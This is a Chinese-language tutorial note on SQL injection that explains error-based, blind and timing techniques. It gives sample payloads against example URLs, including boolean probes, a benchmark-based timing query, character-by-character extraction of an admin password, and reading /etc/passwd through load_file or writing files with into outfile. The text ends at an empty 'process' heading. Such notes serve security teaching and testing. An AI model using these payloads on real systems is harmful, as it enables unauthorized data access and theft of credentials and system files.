# SQL Injection

## 简介

SQL Injection，即SQL注入，是指攻击者利用服务端对用户输入处理的漏洞，输入一些SQL代码，通过闭合引号等手段使服务器将其作为SQL语句而执行，从而造成攻击者对目标数据库的非授权访问，可能产生数据泄露、损毁、篡改等。

## 姿势

### 错误回显注入

如果Web服务器开启了错误回显，通过对输入内容的报错回显可以推理SQL逻辑从而很容易构造Payload。

### 盲注

多数时候Web服务器并不会提供错误的回显，这时候我们需要借用盲注的技巧。

在盲注的情况下，攻击者需要一种手段来确认输入的Payload所产生的影响，而观察页面的变化是最常用的参照，比如以下Payload：

```js
业务URL：http://example.com/news.php?id=10
SQL逻辑：SELECT title, description, body FROM news WHERE id = 10

攻击Payload: ?id=10 and 1=2，造成查询为空，页面可能为空
```

当然以上Payload显示的页面异常也有可能是服务端检测到了非法Payload而做了处理的结果，所以确认注入点还需要后面的步骤。

```js
?id = 10 and 1=1返回页面正常说明确实有问题。
```

### Timing Attack

通过注入一些执行起来花费时间的SQL语句，观察Web请求的响应时间变化也可以判断是否存在SQL注入漏洞。

常用的函数：

MySQL：

```
benchmark(times,function)，benchmark某个函数function times次数
如benchmark(1000000, encode('hello','goodbye'))
sleep(seconds)，休眠seconds秒。
```

举例一个Payload：

```
10 union select if(substring(current,1,1)=char(119),benchmark(5000000,md5(1)) from (select database() as current) as tbl;
```

## 数据库攻击技巧

### 便利函数

database\(\) - 返回当前数据库名。

system\_user\(\) - 返回数据库的系统用户。

current\_user\(\) - 返回当前用户身份。

version\(\) - 数据库版本号。

### 常见技巧

猜解数据库版本：?id = 5 and substring\(@@version,1,1\)=4

判断表是否存在：?id = 5 union all select 1,2,3 from 表名

判断表中某列是否存在：?id = 5 union all select 1,2,列名 from 某表

具体猜解列中数据：?id = 5 and ascii\(substring\(\(select passwd from admin limit 0,1\),1,1\)&gt;64\) **二分法**

读取文件：?id = 5 union select 1,2,load\_file\('/etc/passwd'\) **需要读权限**

写文件：?id = 5 union select ... into outfile '/file' 或者 into dumpfile 'file'，dumpfile相比outfile更适合二进制文件。

### 流程



